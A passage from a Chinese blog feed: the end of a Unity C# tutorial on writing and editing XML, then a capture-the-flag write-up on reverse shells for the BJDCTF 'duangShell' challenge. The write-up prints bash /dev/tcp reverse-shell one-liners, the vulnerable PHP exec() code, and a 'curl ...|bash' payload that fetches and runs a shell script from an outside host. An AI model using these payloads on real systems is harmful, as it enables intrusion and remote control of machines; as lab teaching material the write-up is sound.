class="number">3</span>; i++)</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    XmlElement childNode = xml.CreateElement(<span class="string">"int"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    childNode.InnerText = i.ToString();</span></pre></td></tr><tr><td class="code"><pre><span class="line">    listInt.AppendChild(childNode);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">root.AppendChild(listInt);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">XmlElement itemList = xml.CreateElement(<span class="string">"itemList"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">3</span>; i++)</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    XmlElement childNode = xml.CreateElement(<span class="string">"Item"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//添加属性</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    childNode.SetAttribute(<span class="string">"id"</span>, i.ToString());</span></pre></td></tr><tr><td class="code"><pre><span class="line">    childNode.SetAttribute(<span class="string">"num"</span>, (i * <span class="number">10</span>).ToString());</span></pre></td></tr><tr><td class="code"><pre><span class="line">    itemList.AppendChild(childNode);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">root.AppendChild(itemList);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//5.保存</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">xml.Save(path);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">endregion</span></span></span></pre></td></tr></table></figure>

<p>修改xml文件</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( File.Exists(path) )</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//2.加载后 直接添加节点 移除节点即可</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    XmlDocument newXml = <span class="keyword">new</span> XmlDocument();</span></pre></td></tr><tr><td class="code"><pre><span class="line">    newXml.Load(path);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//修改就是在原有文件基础上 去移除 或者添加</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//移除</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    XmlNode node;<span class="comment">// = newXml.SelectSingleNode("Root").SelectSingleNode("atk");</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//这种是一种简便写法 通过/来区分父子关系</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    node = newXml.SelectSingleNode(<span class="string">"Root/atk"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//得到自己的父节点</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    XmlNode root2 = newXml.SelectSingleNode(<span class="string">"Root"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//移除子节点方法</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    root2.RemoveChild(node);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//添加节点</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    XmlElement speed = newXml.CreateElement(<span class="string">"moveSpeed"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    speed.InnerText = <span class="string">"20"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    root2.AppendChild(speed);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//改了记得存</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    newXml.Save(path);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p>总结</p>
<p>1.路径选取<br>在运行过程中存储 只能往可写且能找到的文件夹存储<br>故 选择了Application.persistentDataPath</p>
<p>2.存储xml关键类<br>XmlDocument  文件<br>创建节点 CreateElement<br>创建固定内容方法 CreateXmlDeclaration<br>添加节点 AppendChild<br>保存 Save<br>XmlDeclaration 版本<br>XmlElement 元素节点<br>设置属性方法SetAttribute</p>
<p>3.修改<br>RemoveChild移除节点<br>可以通过 /的形式 来表示 子节点的子节点 </p>
]]></content>
  </entry>
  <entry>
    <title>反弹shell</title>
    <url>/2020/07/05/%E5%8F%8D%E5%BC%B9shell/</url>
    <content><![CDATA[<p>从BJDCTF中的一道题来引入反弹shell这个知识点，因为本人过菜之前不知道还有这个知识，今天有空就写一下知识点，记录下该题。</p>
<a id="more"></a>

<h2 id="1、前提知识："><a href="#1、前提知识：" class="headerlink" title="1、前提知识："></a>1、前提知识：</h2><h3 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.20.151&#x2F;8080 0&gt;&amp;1</span></pre></td></tr></table></figure>

<p><strong>bash一句话命令详解</strong><br>以下针对常用的bash反弹一句话进行了拆分说明，具体内容如下。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85MTEzOTgxLTQ4OTdlODU4NmExZWJlYjQucG5n" alt="image.png"></p>
<p>bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</p>
<h2 id="2、-BJDCTF-2nd-duangShell"><a href="#2、-BJDCTF-2nd-duangShell" class="headerlink" title="2、[BJDCTF 2nd]duangShell"></a>2、[BJDCTF 2nd]duangShell</h2><p>how can i give you source code? .swp?!<br>where is P3rh4ps’s girl friend ???</p>
<p>题目提示了.swp说明应该有文件泄露，在.index.php.swp中可以下载到源代码</p>
<p>打开是有点奇怪，去kali下运用vim -r index.php.swp恢复文件得到源代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;head&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &lt;title&gt;give me a girl&lt;&#x2F;title&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;&#x2F;head&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;body&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;&#x2F;body&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;&#x2F;html&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line">error_reporting(0);</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">if (!isset($_POST[&#39;girl_friend&#39;])) &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    die(&quot;where is P3rh4ps&#39;s girl friend ???&quot;);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125; else &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $girl &#x3D; $_POST[&#39;girl_friend&#39;];</span></pre></td></tr><tr><td class="code"><pre><span class="line">    if (preg_match(&#39;&#x2F;\&gt;|\\\&#x2F;&#39;, $girl)) &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        die(&#39;just girl&#39;);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125; else if (preg_match(&#39;&#x2F;ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$&#x2F;i&#39;, $girl)) &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        echo &quot;&lt;img src&#x3D;&#39;img&#x2F;p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125; else &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#x2F;&#x2F;duangShell~~~~</span></pre></td></tr><tr><td class="code"><pre><span class="line">        exec($girl);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p>由于过滤了许多指令，这里首选反弹shell来做该题。</p>
<p>首先在再开一个小号在buu的Basic的Liunx Labs中开一个环境</p>
<p>这里给出了ssh 用户名：root 密码：123456 地址和端口为动态分配的。</p>
<p>之后便在kali下用ssh连接</p>
<p>ssh -p 27705 <a href="mailto:root@911-cc1913a9-f68f-44ea-a069-e4e678dfdcd7node3.buuoj.cn" target="_blank" rel="noopener">root@911-cc1913a9-f68f-44ea-a069-e4e678dfdcd7node3.buuoj.cn</a></p>
<p>之后先用ifconfig查询ip</p>
<p><img src="/2020/07/05/%E5%8F%8D%E5%BC%B9shell/1586258681040.png" alt="1586258681040"></p>
<p>174.1.227.134</p>
<p>之后在/var/www/html中创建一个shell.txt</p>
<p>写入bash -i &gt;&amp; /dev/tcp/174.1.227.114/23333 0&gt;&amp;1</p>
<p>再用nc -lvp 23333去监听这个端口</p>
<p>然后回到之前的页面post发送girl_friend=curl <a href="http://174.1.227.134/shell.txt|bash" target="_blank" rel="noopener">http://174.1.227.134/shell.txt|bash</a></p>
<p>去反弹shell</p>
<p><img src="/2020/07/05/%E5%8F%8D%E5%BC%B9shell/1586258736780.png" alt="1586258736780"></p>
<p>直接cat /flag发现flag是假的，则用find / -name flag来查询flag</p>
<p>最终得到flag</p>
<p><img src="/2020/07/05/%E5%8F%8D%E5%BC%B9shell/1586258801638.png" alt="1586258801638"></p>
<p>详细原理可看大佬文章：</p>
<p>Linux反弹shell（一）文件描述符与重定向 <a href="https://xz.aliyun.com/t/2548" target="_blank" rel="noopener">https://xz.aliyun.com/t/2548</a></p>
<p>Linux 反弹shell（二）反弹shell的本质 <a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">https://xz.aliyun.com/t/2549</a></p>
<p>Linux下几种常见的反弹shell方式 <a href="http://www.lin2zhen.top/index.php/archives/9/" target="_blank" rel="noopener">http://www.lin2zhen.top/index.php/archives/9/</a></p>
]]></content>
  </entry>
</search>
